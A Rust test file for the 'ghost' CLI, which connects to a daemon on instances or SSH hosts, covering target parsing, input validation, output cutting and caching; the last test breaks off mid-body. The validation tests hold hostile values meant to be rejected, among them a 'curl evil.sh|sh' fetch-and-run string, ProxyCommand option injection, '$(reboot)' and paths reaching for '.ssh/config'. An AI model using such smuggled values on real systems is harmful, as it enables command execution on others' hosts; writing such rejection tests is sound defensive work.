//! Tests of `ghost x`, `ghost ghostd` and `ghost mcp`. The ones named
//! `ghostd_*` and ignored need a real ghostd: run them with
//! `GHOSTD_BIN=/path/to/ghostd cargo test -p ghost -- --ignored ghostd`.

use std::{
    ffi::OsString,
    path::{Path, PathBuf},
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
    time::{Duration, Instant},
};

use ghostd_protocol::v1::{ExecSpec, FileKind, Outcome, Program, Request, Stat};
use gigahost_client_api::website::{InstanceView, PortForwardView};
use serde_json::{Value, json};
use tokio::io::{AsyncBufReadExt as _, AsyncWriteExt as _, BufReader};
use uuid::Uuid;

use super::{
    StatusView, channel,
    conn::{self, MAX_CONNECTIONS, Pool, fresh_job_id},
    install,
    mcp::{self, GhostServer},
    ops,
    target::{
        self, Endpoint, HostKeys, NOT_INSTALLED, REMOTE_COMMAND, Resolver, Target,
        instance_address, instance_alias, known_hosts_file_in, parse_target, remove_known_host,
    },
    x,
};
use crate::{InstanceReference, keys};

#[test]
fn targets_parse() {
    assert_eq!(parse_target("local"), Ok(Target::Local));
    let id = Uuid::now_v7();
    assert_eq!(
        parse_target(&id.to_string()),
        Ok(Target::Instance(InstanceReference::Id(id)))
    );
    assert_eq!(
        parse_target("Web-1"),
        Ok(Target::Instance(InstanceReference::Name(
            "web-1".to_owned()
        )))
    );
    assert_eq!(
        parse_target("ssh://example.com"),
        Ok(Target::Ssh {
            user: None,
            host: "example.com".to_owned(),
            port: None
        })
    );
    assert_eq!(
        parse_target("ssh://me@example.com:2222"),
        Ok(Target::Ssh {
            user: Some("me".to_owned()),
            host: "example.com".to_owned(),
            port: Some(2222)
        })
    );
    assert_eq!(
        parse_target("ssh://root@[2001:db8::1]:22/"),
        Ok(Target::Ssh {
            user: Some("root".to_owned()),
            host: "2001:db8::1".to_owned(),
            port: Some(22)
        })
    );
    assert_eq!(
        parse_target("ssh://alias-from-ssh-config"),
        Ok(Target::Ssh {
            user: None,
            host: "alias-from-ssh-config".to_owned(),
            port: None
        })
    );
}

#[test]
fn hostile_targets_are_refused() {
    for bad in [
        "ssh://-oProxyCommand=evil",
        "ssh://me@-oProxyCommand=evil",
        "ssh://-l@host",
        "ssh://host name",
        "ssh://host\tname",
        "ssh://host\nname",
        "ssh://ho\u{1b}st",
        "ssh://",
        "ssh://me@",
        "ssh://host:0",
        "ssh://host:65536",
        "ssh://host:+22",
        "ssh://host:22x",
        "ssh://host/path",
        "ssh://ho'st",
        "ssh://[::1",
        "ssh://[not-v6]:22",
        "ssh://me me@host",
        // What a shell would take, through a ProxyCommand's or a Match
        // exec's %h or %u.
        "ssh://x;curl${IFS}evil.sh|sh",
        "ssh://x$(id)",
        "ssh://x`id`",
        "ssh://x|y",
        "ssh://x&y",
        "ssh://x(y)",
        "ssh://x<y>",
        "ssh://x{y}",
        "ssh://x%h",
        "ssh://x*",
        "ssh://me;id@host",
        "ssh://$(id)@host",
        "ssh://`id`@host",
        "ssh://a|b@host",
        "ssh://[fe80::1%eth0]",
        "not a name",
        "-oProxyCommand=x",
        "",
    ] {
        assert!(parse_target(bad).is_err(), "{bad:?} was accepted");
    }
    assert!(target::valid_user("-oX").is_err());
    assert!(target::valid_user("a b").is_err());
    assert!(target::valid_user("a$b").is_err());
    assert!(target::valid_user("root").is_ok());
    assert!(target::valid_user("deploy_1.x-y").is_ok());
    assert!(target::valid_host("web-1.example_test").is_ok());
    assert!(target::valid_host("203.0.113.7").is_ok());
    assert!(target::valid_host("2001:db8::1").is_ok());
    assert!(target::valid_host("2001:db8::1;id").is_err());
}

/// The command run on the far side is a constant: no user data is in it,
/// and the host, port and user are separate `ssh` arguments before `--`
/// and the host.
#[test]
fn the_remote_command_is_fixed() {
    assert_eq!(
        REMOTE_COMMAND,
        r#"sh -c 'for g in "$HOME/.local/bin/ghostd" /usr/local/bin/ghostd; do [ -x "$g" ] && exec "$g" stdio --client ghost; done; echo "ghostd is not installed" >&2; exit 127'"#
    );
    // Single quotes only, around the script, and no backslashes, so any
    // login shell passes it to sh unchanged.
    assert_eq!(REMOTE_COMMAND.matches('\'').count(), 2);
    assert!(!REMOTE_COMMAND.contains('\\'));
    assert!(REMOTE_COMMAND.contains(NOT_INSTALLED));
    let endpoint = Endpoint::Ssh {
        host: "203.0.113.7".to_owned(),
        port: Some(2222),
        user: Some("root".to_owned()),
        control_path: None,
        host_keys: None,
    };
    let argv: Vec<String> = endpoint
        .argv()
        .into_iter()
        .map(|arg| arg.into_string().unwrap())
        .collect();
    assert_eq!(
        argv,
        [
            "ssh",
            "-T",
            "-o",
            "BatchMode=yes",
            "-o",
            "ServerAliveInterval=15",
            "-o",
            "ServerAliveCountMax=3",
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-p",
            "2222",
            "-l",
            "root",
            "--",
            "203.0.113.7",
            REMOTE_COMMAND,
        ]
    );
    let multiplexed = Endpoint::Ssh {
        host: "h".to_owned(),
        port: None,
        user: None,
        control_path: Some(PathBuf::from("/run/user/1000/ghost/ssh-%C")),
        host_keys: None,
    };
    let argv: Vec<String> = multiplexed
        .argv()
        .into_iter()
        .map(|arg| arg.into_string().unwrap())
        .collect();
    assert!(
        argv.windows(2)
            .any(|pair| pair == ["-o", "ControlMaster=auto"])
    );
    assert!(
        argv.windows(2)
            .any(|pair| pair == ["-o", "ControlPersist=600"])
    );
    assert!(
        argv.windows(2)
            .any(|pair| pair == ["-o", "ControlPath=/run/user/1000/ghost/ssh-%C"])
    );
    assert_eq!(argv.last().map(String::as_str), Some(REMOTE_COMMAND));
}

/// Whatever a target names, the remote command stays the same string.
#[test]
fn no_user_data_reaches_the_remote_command() {
    for (host, user) in [
        ("example.com", Some("deploy")),
        ("2001:db8::1", None),
        ("$(reboot)", Some("`id`")),
    ] {
        let endpoint = Endpoint::Ssh {
            host: host.to_owned(),
            port: Some(22),
            user: user.map(str::to_owned),
            control_path: None,
            host_keys: None,
        };
        let argv = endpoint.argv();
        assert_eq!(argv.last().unwrap(), &OsString::from(REMOTE_COMMAND));
        // The host is its own argument, after `--`.
        let dashes = argv.iter().position(|arg| arg == "--").unwrap();
        assert_eq!(argv[dashes + 1], OsString::from(host));
        assert_eq!(dashes + 3, argv.len());
    }
}

#[test]
fn install_refs_travel_as_an_argument() {
    let long = "a".repeat(101);
    for bad in [
        "",
        "-x",
        "--ref=x",
        "v1;reboot",
        "v1 v2",
        "$(id)",
        "`id`",
        "a'b",
        "a\"b",
        "../etc",
        "a/../b",
        "a\nb",
        long.as_str(),
    ] {
        assert!(install::valid_ref(bad).is_err(), "{bad:?} was accepted");
        assert!(install::sh_arguments(Some(bad)).is_err());
        assert!(install::remote_command(Some(bad)).is_err());
    }
    for good in [
        "v0.1.0",
        "main",
        "feature/x_y-1",
        "230b2eab2af9129effbea142302664c9ea27e297",
    ] {
        let arguments = install::sh_arguments(Some(good)).unwrap();
        assert_eq!(
            arguments,
            ["-c", install::INSTALL_REF_SCRIPT, "sh", good],
            "the ref is $1, outside the script"
        );
        assert!(!install::INSTALL_REF_SCRIPT.contains(good));
        assert_eq!(
            install::remote_command(Some(good)).unwrap(),
            format!("sh -c '{}' sh {good}", install::INSTALL_REF_SCRIPT)
        );
    }
    assert!(!install::INSTALL_REF_SCRIPT.contains('\''));
    assert!(!install::INSTALL_DEFAULT_SCRIPT.contains('\''));
    assert_eq!(
        install::remote_command(None).unwrap(),
        format!("sh -c '{}'", install::INSTALL_DEFAULT_SCRIPT)
    );
    assert!(install::INSTALL_DEFAULT_SCRIPT.contains("/ghostd/main/install.sh"));
    assert!(!install::INSTALL_DEFAULT_SCRIPT.contains("--ref"));
}

#[test]
fn exit_codes_map_as_a_shell_does() {
    assert_eq!(x::exit_code(&Outcome::Exited { code: 0 }), 0);
    assert_eq!(x::exit_code(&Outcome::Exited { code: 3 }), 3);
    assert_eq!(x::exit_code(&Outcome::Exited { code: 255 }), 255);
    assert_eq!(x::exit_code(&Outcome::Signaled { signal: 9 }), 137);
    assert_eq!(x::exit_code(&Outcome::Signaled { signal: 15 }), 143);
    assert_eq!(x::exit_code(&Outcome::TimedOut { killed: true }), 124);
    assert_eq!(x::exit_code(&Outcome::TimedOut { killed: false }), 124);
    assert_eq!(
        x::exit_code(&Outcome::FailedToStart {
            message: String::new()
        }),
        127
    );
}

fn instance_fixture() -> InstanceView {
    InstanceView {
        kind: gigahost_client_api::website::InstanceKind::Vm,
        container: None,
        instance_id: Uuid::now_v7(),
        offering_id: "offering".to_owned(),
        restored_from_backup_id: None,
        hostname: "vm".to_owned(),
        tags: Vec::new(),
        redundant_tags: Vec::new(),
        name: "vm".to_owned(),
        root_disk_bytes: 10 << 30,
        state: gigahost_client_api::website::InstanceState::Running,
        desired_power_state: gigahost_client_api::hypervisor::PowerState::Running,
        holds_capacity: true,
        public_ipv4: None,
        gateway_tier: None,
        gateway_location: None,
        gateway_change_free: false,
        port_forwards: Vec::new(),
        outgoing_ports: None,
        network_microusd_per_tib: 0,
        outgoing_mail_allowed: false,
        created_at: chrono::Utc::now(),
        billing_started_at: None,
        billing_ended_at: None,
        deleted_at: None,
        balance_reservation_microusd: 0,
        provider_termination: None,
        pricing: None,
        image: None,
        provider_id: None,
        provider_name: String::new(),
        host_mode: None,
        location: String::new(),
        location_name: String::new(),
        country_code: String::new(),
        cpu_tier: None,
        vcpu_count: 1,
        memory_bytes: 1 << 30,
        firmware: None,
        active_job: None,
        last_restore: None,
        backup_limits: None,
        guest_initialization: None,
        bandwidth: None,
        sla: None,
        hold: None,
        access_reset: None,
        rescue: None,
    }
}

#[test]
fn instance_addresses_are_validated() {
    let mut instance = instance_fixture();
    instance.public_ipv4 = Some("203.0.113.7".to_owned());
    instance.port_forwards = vec![
        PortForwardView {
            public_port: 8080,
            guest_port: 80,
        },
        PortForwardView {
            public_port: 22022,
            guest_port: 22,
        },
    ];
    let address = instance_address(&instance).unwrap();
    assert_eq!(address.address.to_string(), "203.0.113.7");
    assert_eq!(address.port, 22022);
    for bad in [
        "-oProxyCommand=x",
        "203.0.113.7 -p1",
        "2001:db8::1",
        "host.example",
    ] {
        instance.public_ipv4 = Some(bad.to_owned());
        assert!(instance_address(&instance).is_err(), "{bad:?} was accepted");
    }
    // A shared IP instance without a forward to its port 22.
    instance.public_ipv4 = Some("203.0.113.7".to_owned());
    instance
        .port_forwards
        .retain(|forward| forward.guest_port != 22);
    assert!(instance_address(&instance).is_err());
    instance.port_forwards.clear();
    instance.gateway_tier = Some(gigahost_client_api::website::GatewayTier::SharedIp);
    assert!(instance_address(&instance).is_err());
    // An address of its own: SSH on port 22.
    instance.gateway_tier = None;
    let own = instance_address(&instance).unwrap();
    assert_eq!(own.port, 22);
    instance.public_ipv4 = None;
    assert!(instance_address(&instance).is_err());
}

/// A container instance of the renter's own image has no SSH, and is
/// refused before ghost tries; one of a stock image is reached as a VM, as
/// one an older backend does not name the stock image of but whose image
/// is the platform's.
#[test]
fn a_container_of_the_renters_image_has_no_ssh() {
    use gigahost_client_api::website::{ContainerInstanceView, InstanceKind};
    let mut instance = instance_fixture();
    instance.public_ipv4 = Some("203.0.113.7".to_owned());
    instance.kind = InstanceKind::Container;
    let container = |image: &str, stock_image: Option<&str>| ContainerInstanceView {
        image: image.to_owned(),
        image_digest: None,
        image_unknown: false,
        stock_image: stock_image.map(str::to_owned),
        restart_policy: gigahost_client_api::hypervisor::RestartPolicy::Always,
        volumes: Vec::new(),
        entrypoint: None,
        command: None,
        user: None,
        workdir: None,
        status: None,
    };
    instance.container = Some(container("registry-1.docker.io/library/nginx:1.27", None));
    let error = instance_address(&instance).unwrap_err().to_string();
    assert!(
        error.starts_with("this container instance has no SSH: "),
        "{error}"
    );
    assert!(
        error.contains(&format!("ghost instance logs {}", instance.instance_id)),
        "{error}"
    );
    let reference = format!("ghcr.io/gigahost-apps/debian@sha256:{}", "1".repeat(64));
    for stock in [Some("debian-13"), None] {
        instance.container = Some(container(&reference, stock));
        assert_eq!(instance_address(&instance).unwrap().port, 22);
    }
    instance.kind = InstanceKind::Vm;
    instance.container = None;
    assert_eq!(instance_address(&instance).unwrap().port, 22);
}

#[test]
fn lossy_text_skips_a_cut_character() {
    let data = "é".repeat(3);
    let bytes = &data.as_bytes()[1..];
    assert_eq!(ops::lossy(bytes, true), ("éé".to_owned(), true, 1));
    assert_eq!(ops::lossy(b"ab", false), ("ab".to_owned(), true, 0));
    let (text, valid, _) = ops::lossy(b"a\xffb", false);
    assert_eq!(text, "a\u{fffd}b");
    assert!(!valid);
    assert_eq!(ops::parse_mode("755"), Ok(0o755));
    assert_eq!(ops::parse_mode("0644"), Ok(0o644));
    assert!(ops::parse_mode("9").is_err());
    assert!(ops::parse_mode("").is_err());
    assert!(fresh_job_id().starts_with('j'));
    assert_eq!(fresh_job_id().len(), 17);
    assert_eq!(super::mcp::parse_signal("TERM").unwrap(), 15);
    assert_eq!(super::mcp::parse_signal("SIGKILL").unwrap(), 9);
    assert_eq!(super::mcp::parse_signal("2").unwrap(), 2);
    assert!(super::mcp::parse_signal("0").is_err());
    assert!(super::mcp::parse_signal("NOPE").is_err());
}

fn stat(kind: FileKind) -> Stat {
    Stat {
        kind,
        size: 1,
        mode: 0o644,
        mtime_ms: 0,
        uid: 0,
        gid: 0,
        link_target: None,
    }
}

/// A remote listing's paths become local paths in a sync down, so one that
/// is absolute or climbs out stops the sync.
#[test]
fn remote_listings_with_unplain_paths_are_refused() {
    for bad in [
        &b"/home/me/.bashrc"[..],
        b"../../.ssh/config",
        b"a/../../b",
        b"..",
        b".",
        b"./a",
        b"a//b",
        b"a/",
        b"",
        b"a\0b",
    ] {
        let mut tree = ops::RemoteTree::default();
        let added = tree.add(b"", &[(bad.to_vec(), stat(FileKind::File))]);
        assert!(added.is_err(), "{bad:?} was taken");
        let mut tree = ops::RemoteTree::default();
        assert!(
            tree.add(b"sub", &[(bad.to_vec(), stat(FileKind::Dir))])
                .is_err(),
            "{bad:?} was taken as a directory"
        );
    }
    assert!(ops::plain_relative(&vec![b'a'; 4097]).is_err());
    assert!(ops::plain_relative(b"a/b.c/..d").is_ok());
}

/// A directory a listing shows nothing below (empty, unreadable, or deeper
/// than it went) is listed on its own next.
#[test]
fn remote_directories_shown_empty_are_listed_again() {
    let mut tree = ops::RemoteTree::default();
    let pending = tree
        .add(
            b"base",
            &[
                (b"a".to_vec(), stat(FileKind::Dir)),
                (b"a/b".to_vec(), stat(FileKind::File)),
                (b"ab".to_vec(), stat(FileKind::Dir)),
                (b"c".to_vec(), stat(FileKind::Dir)),
                (b"c/d".to_vec(), stat(FileKind::Dir)),
                (b"e".to_vec(), stat(FileKind::Symlink)),
                (b"f".to_vec(), stat(FileKind::File)),
            ],
        )
        .unwrap();
    assert_eq!(pending, [b"base/ab".to_vec(), b"base/c/d".to_vec()]);
    assert_eq!(
        tree.files.keys().cloned().collect::<Vec<_>>(),
        [b"base/a/b".to_vec(), b"base/f".to_vec()]
    );
    assert_eq!(tree.skipped, 1);
}

/// A result's text block holds the summary and the structured content as
/// JSON, for clients that pass only the text to the model, within the cap.
#[test]
fn result_text_carries_the_result_as_json() {
    let value = json!({"stdout": "a \"quoted\"\nline", "exit_code": 0});
    let text = super::mcp::result_text("exited with 0", &value);
    let (summary, rest) = text.split_once('\n').unwrap();
    assert_eq!(summary, "exited with 0");
    assert_eq!(serde_json::from_str::<Value>(rest).unwrap(), value);
    let large = json!({"text": "x".repeat(super::mcp::TEXT_CAP)});
    let text = super::mcp::result_text("big", &large);
    assert!(text.len() <= super::mcp::TEXT_CAP);
    assert!(
        text.ends_with("output_file get the rest]"),
        "{}",
        &text[text.len() - 200..]
    );
}

/// Text is cut where its JSON would pass the cap, and says how many bytes
/// it took, invalid ones included, so that a next read goes on from there.
#[test]
fn text_within_cuts_by_its_json_size() {
    let all = ops::text_within(b"ab\ncd", false, 100, true);
    assert_eq!(
        all,
        ops::CutText {
            text: "ab\ncd".to_owned(),
            valid_utf8: true,
            skipped: 0,
            used: 5,
            cut: false
        }
    );
    // "ab\n" takes 4 bytes as JSON ("\n" is two).
    let cut = ops::text_within(b"ab\ncd", false, 4, true);
    assert_eq!((cut.text.as_str(), cut.used, cut.cut), ("ab\n", 3, true));
    // A control character takes six (\u0001).
    let cut = ops::text_within(b"a\x01b", false, 6, true);
    assert_eq!((cut.text.as_str(), cut.used), ("a", 1));
    // Each invalid sequence becomes a replacement character, and its bytes
    // count.
    let lossy = ops::text_within(b"a\xff\xfeb", false, 100, true);
    assert_eq!(lossy.text, "a\u{fffd}\u{fffd}b");
    assert!(!lossy.valid_utf8);
    assert_eq!(lossy.used, 4);
    let cut = ops::text_within(b"a\xffb", false, 4, true);
    assert_eq!(
        (cut.text.as_str(), cut.used, cut.cut),
        ("a\u{fffd}", 2, true)
    );
    // A cut character at the start is skipped and counted apart.
    let data = "é".repeat(2);
    let skipped = ops::text_within(&data.as_bytes()[1..], true, 100, true);
    assert_eq!(
        (skipped.text.as_str(), skipped.skipped, skipped.used),
        ("é", 1, 2)
    );
}

/// A slice that holds nothing but the start of one character (a read of
/// 1 to 3 bytes) still advances: it shows a replacement character instead
/// of leaving it for a next read that would answer the same.
#[test]
fn a_slice_of_one_unfinished_character_still_advances() {
    let euro = "€".as_bytes();
    for len in 1..euro.len() {
        let cut = ops::text_within(&euro[..len], false, 100, false);
        assert_eq!(cut.text, "\u{fffd}", "{len}");
        assert!(cut.skipped + cut.used > 0, "{len}");
    }
}

/// A character the slice's end cuts off is left for the next read, which
/// then starts at its first byte and shows it whole; only the stream's
/// last bytes show an unfinished character as invalid.
#[test]
fn a_character_cut_by_the_slice_end_is_read_next() {
    let data = "aé".as_bytes();
    let first = ops::text_within(&data[..2], false, 100, false);
    assert_eq!(
        (first.text.as_str(), first.valid_utf8, first.used, first.cut),
        ("a", true, 1, true)
    );
    let next = ops::text_within(&data[first.used..], false, 100, true);
    assert_eq!((next.text.as_str(), next.valid_utf8), ("é", true));
    // At the end, the unfinished bytes are what the stream holds.
    let last = ops::text_within(&data[..2], false, 100, true);
    assert_eq!(
        (last.text.as_str(), last.valid_utf8, last.used, last.cut),
        ("a\u{fffd}", false, 2, false)
    );
    // Bytes that can never become a character are shown and counted.
    let invalid = ops::text_within(b"a\xffb\xe2\x82", false, 100, false);
    assert_eq!(
        (invalid.text.as_str(), invalid.used, invalid.cut),
        ("a\u{fffd}b", 3, true)
    );
}

/// The install's output says which version it built and whether a daemon
/// that runs the old binary still answers.
#[test]
fn install_output_names_the_version_and_a_running_daemon() {
    let mut notes = install::InstallNotes::default();
    notes.observe("ghostd install: installed /root/.local/bin/ghostd");
    assert!(!notes.daemon_runs);
    assert_eq!(notes.version, None);
    notes.observe(r#"{"binary":"/root/.local/bin/ghostd","config":"/x","version":"0.2.0"}"#);
    assert_eq!(notes.version.as_deref(), Some("0.2.0"));
    notes.observe(r#"{"version":"9"}"#);
    assert_eq!(
        notes.version.as_deref(),
        Some("0.2.0"),
        "not setup's summary"
    );
    notes.observe(
        "ghostd install: a ghostd daemon runs: the new binary takes effect after `ghostd stop` (the next `ghostd stdio` starts it again)",
    );
    assert!(notes.daemon_runs);
}

/// An HTTP server that answers each connection with the next canned
/// `(status, body)`, and counts the requests.
async fn canned_api(responses: Vec<(u16, String)>) -> (String, Arc<std::sync::Mutex<Vec<String>>>) {
    use tokio::io::AsyncReadExt as _;
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}/", listener.local_addr().unwrap());
    let received = Arc::new(std::sync::Mutex::new(Vec::new()));
    let log = Arc::clone(&received);
    tokio::spawn(async move {
        for (status, body) in responses {
            let (mut stream, _) = listener.accept().await.unwrap();
            let mut request = Vec::new();
            let mut chunk = [0_u8; 4096];
            while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                let read = stream.read(&mut chunk).await.unwrap();
                assert_ne!(read, 0, "the request ended inside its headers");
                request.extend_from_slice(&chunk[..read]);
            }
            let line = String::from_utf8_lossy(&request)
                .lines()
                .next()
                .unwrap_or_default()
                .to_owned();
            log.lock().unwrap().push(line);
            let response = format!(
                "HTTP/1.1 {status} Canned\r\ndate: {}\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                chrono::Utc::now().format("%a, %d %b %Y %H:%M:%S GMT"),
                body.len()
            );
            stream.write_all(response.as_bytes()).await.unwrap();
            let _ = stream.shutdown().await;
        }
    });
    (url, received)
}

fn named(name: &str, address: &str) -> InstanceView {
    let mut instance = instance_fixture();
    name.clone_into(&mut instance.name);
    name.clone_into(&mut instance.hostname);
    instance.public_ipv4 = Some(address.to_owned());
    instance
}

fn host_of(endpoint: &Endpoint) -> String {
    match endpoint {
        Endpoint::Ssh { host, .. } => host.clone(),
        Endpoint::Local { .. } => "local".to_owned(),
    }
}

/// A name's instance ID and an instance's address are cached for 24 hours,
/// for one account only: the second lookup asks nothing, `fresh` asks the
/// API again, and another account's key does not get the first account's
/// entries.
#[tokio::test]
async fn names_and_addresses_are_cached_per_account() {
    use std::os::unix::fs::PermissionsExt as _;
    let directory = tempfile::tempdir().unwrap();
    let seed_a = directory.path().join("a.seed");
    let seed_b = directory.path().join("b.seed");
    keys::generate_seed(&seed_a).unwrap();
    keys::generate_seed(&seed_b).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let first = named("web", "203.0.113.7");
    let mut renamed = first.clone();
    "old".clone_into(&mut renamed.name);
    let second = named("web", "203.0.113.8");
    let not_found =
        json!({"error": {"code": "instance_not_found", "message": "no such instance"}}).to_string();
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&[&first]).unwrap()),
        (200, serde_json::to_string(&first).unwrap()),
        (200, serde_json::to_string(&[&renamed, &second]).unwrap()),
        (200, serde_json::to_string(&second).unwrap()),
        (404, not_found.clone()),
        (404, not_found),
    ])
    .await;
    let account_a = Resolver::for_tests(&url, Some(seed_a), Some(cache.clone()));
    let web = Target::Instance(InstanceReference::Name("web".to_owned()));
    let resolved = account_a.resolve(&web, None, false).await.unwrap();
    assert_eq!(host_of(&resolved.endpoint), "203.0.113.7");
    assert!(!resolved.cached);
    assert_eq!(received.lock().unwrap().len(), 2);
    // Cached: no request; the name matches without regard to case.
    let upper = Target::Instance(InstanceReference::Name("WEB".to_owned()));
    let resolved = account_a.resolve(&upper, None, false).await.unwrap();
    assert_eq!(host_of(&resolved.endpoint), "203.0.113.7");
    assert!(resolved.cached);
    assert_eq!(resolved.instance_id, Some(first.instance_id));
    assert_eq!(
        resolved.host_key,
        format!("instance {} user root", first.instance_id)
    );
    assert_eq!(received.lock().unwrap().len(), 2);
    // Fresh: renamed, and another instance named web: the name goes to it.
    let resolved = account_a.resolve(&web, None, true).await.unwrap();
    assert_eq!(host_of(&resolved.endpoint), "203.0.113.8");
    assert_eq!(received.lock().unwrap().len(), 4);
    let resolved = account_a.resolve(&web, None, false).await.unwrap();
    assert_eq!(host_of(&resolved.endpoint), "203.0.113.8");
    assert_eq!(received.lock().unwrap().len(), 4);
    // The first one's ID: its address from the cache, without a request.
    let by_id = Target::Instance(InstanceReference::Id(first.instance_id));
    let resolved = account_a.resolve(&by_id, Some("me"), false).await.unwrap();
    assert_eq!(host_of(&resolved.endpoint), "203.0.113.7");
    assert!(resolved.cached);
    assert_eq!(
        resolved.host_key,
        format!("instance {} user me", first.instance_id)
    );
    assert_eq!(received.lock().unwrap().len(), 4);
    // Another account's key does not get the first account's cache, for
    // the ID or for the name.
    let account_b = Resolver::for_tests(&url, Some(seed_b), Some(cache.clone()));
    assert!(account_b.resolve(&by_id, None, false).await.is_err());
    assert_eq!(received.lock().unwrap().len(), 5);
    assert!(account_b.resolve(&web, None, false).await.is_err());
    assert_eq!(received.lock().unwrap().len(), 6);
    // The file is the user's alone.
    assert_eq!(
        std::fs::metadata(&cache).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

/// Entries older than 24 hours are asked of the API again, and a cache
/// file that is not one is an empty cache.
#[tokio::test]
async fn old_entries_and_a_corrupt_cache_ask_the_api() {
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("a.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
    ])
    .await;
    let resolver = Resolver::for_tests(&url, Some(seed), Some(cache.clone()));
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    resolver.resolve(&target, None, false).await.unwrap();
    assert_eq!(received.lock().unwrap().len(), 2);
    // Make every entry 25 hours old.
    let mut file: Value = serde_json::from_slice(&std::fs::read(&cache).unwrap()).unwrap();
    let old = chrono::Utc::now().timestamp() - 25 * 3600;
    for scope in file["scopes"].as_object_mut().unwrap().values_mut() {
        for section in ["names", "instances"] {
            for entry in scope[section].as_object_mut().unwrap().values_mut() {
                entry["resolved_at"] = json!(old);
            }
        }
    }
    std::fs::write(&cache, serde_json::to_vec(&file).unwrap()).unwrap();
    let answer = resolver.resolve(&target, None, false).await.unwrap();
    assert!(!answer.cached);
    assert_eq!(received.lock().unwrap().len(), 4);
    // A corrupt file: ignored, then replaced.
    std::fs::write(&cache, b"{not json").unwrap();
    let answer = resolver.resolve(&target, None, false).await.unwrap();
    assert_eq!(host_of(&answer.endpoint), "203.0.113.7");
    assert_eq!(received.lock().unwrap().len(), 6);
    let answer = resolver.resolve(&target, None, false).await.unwrap();
    assert!(answer.cached);
    assert_eq!(received.lock().unwrap().len(), 6);
}

/// Host IDs are kept per account scope and key, and forgetting an
/// instance drops its names, its address and its host IDs for every user,
/// in every scope; a forget of an `ssh://` destination or of `local` drops
/// only theirs.
#[tokio::test]
async fn forgetting_drops_an_instance_s_names_address_and_host_ids() {
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("a.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    let other = named("db", "203.0.113.9");
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
        (200, serde_json::to_string(&[&other]).unwrap()),
        (200, serde_json::to_string(&other).unwrap()),
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
    ])
    .await;
    let resolver = Resolver::for_tests(&url, Some(seed), Some(cache.clone()));
    let web_target = Target::Instance(InstanceReference::Name("web".to_owned()));
    let db_target = Target::Instance(InstanceReference::Name("db".to_owned()));
    resolver.resolve(&web_target, None, false).await.unwrap();
    resolver.resolve(&db_target, None, false).await.unwrap();
    let id = |byte| ghostd_protocol::v2::HostId([byte; 16]);
    let web_root = target::instance_host_key(web.instance_id, "root");
    let web_me = target::instance_host_key(web.instance_id, "me");
    let db_root = target::instance_host_key(other.instance_id, "root");
    let ssh = target::ssh_host_key("example.com", Some(2222), Some("me"));
    for (key, byte) in [(&web_root, 1), (&web_me, 2), (&db_root, 3), (&ssh, 4)] {
        assert!(resolver.store_host_id(key, id(byte)));
    }
    assert!(resolver.store_host_id(target::LOCAL_HOST_KEY, id(5)));
    assert_eq!(resolver.host_id(&web_me), Some(id(2)));
    // Another API's scope does not see them.
    let elsewhere = Resolver::for_tests("http://127.0.0.1:9/", None, Some(cache.clone()));
    assert_eq!(elsewhere.host_id(target::LOCAL_HOST_KEY), None);

    let forgotten = target::forget_instance_in(&cache, web.instance_id);
    assert_eq!(
        forgotten,
        target::Forgotten {
            names: 1,
            instances: 1,
            hosts: 2
        }
    );
    assert_eq!(resolver.host_id(&web_root), None);
    assert_eq!(resolver.host_id(&web_me), None);
    assert_eq!(resolver.host_id(&db_root), Some(id(3)));
    // web is asked of the API again; db is still cached.
    resolver.resolve(&db_target, None, false).await.unwrap();
    assert_eq!(received.lock().unwrap().len(), 4);
    resolver.resolve(&web_target, None, false).await.unwrap();
    assert_eq!(received.lock().unwrap().len(), 6);

    let ssh_target = parse_target("ssh://example.com:2222").unwrap();
    let forgotten = resolver.forget_target(&ssh_target).await.unwrap();
    assert_eq!(forgotten.hosts, 1);
    assert_eq!(resolver.host_id(&ssh), None);
    let forgotten = resolver.forget_target(&Target::Local).await.unwrap();
    assert_eq!(forgotten.hosts, 1);
    assert_eq!(resolver.host_id(target::LOCAL_HOST_KEY), None);
    // By name, from the cache: no request.
    let forgotten = resolver.forget_target(&db_target).await.unwrap();
    assert_eq!(forgotten.names, 1);
    assert_eq!(forgotten.hosts, 1);
    assert_eq!(received.lock().unwrap().len(), 6);
}

/// A cached name whose address is no longer cached (a failed connection
/// dropped it) is looked up among the account's instances, as without the
/// cache: a second instance of the name made elsewhere meanwhile makes it
/// ambiguous, and ghost does not pick the one it knew.
#[tokio::test]
async fn a_cached_name_without_its_address_is_looked_up_again() {
    let directory = tempfile::tempdir().unwrap();
    let seed = directory.path().join("a.seed");
    keys::generate_seed(&seed).unwrap();
    let cache = directory.path().join("cache").join("ghostd-targets.json");
    let web = named("web", "203.0.113.7");
    let other = named("web", "203.0.113.8");
    let (url, received) = canned_api(vec![
        (200, serde_json::to_string(&[&web]).unwrap()),
        (200, serde_json::to_string(&web).unwrap()),
        (200, serde_json::to_string(&[&web, &other]).unwrap()),
    ])
    .await;
    let resolver = Resolver::for_tests(&url, Some(seed), Some(cache));
    let target = Target::Instance(InstanceReference::Name("web".to_owned()));
    resolver.resolve(&target, None, false).await.unwrap();
    resolver.forget_address(web.instance_id);
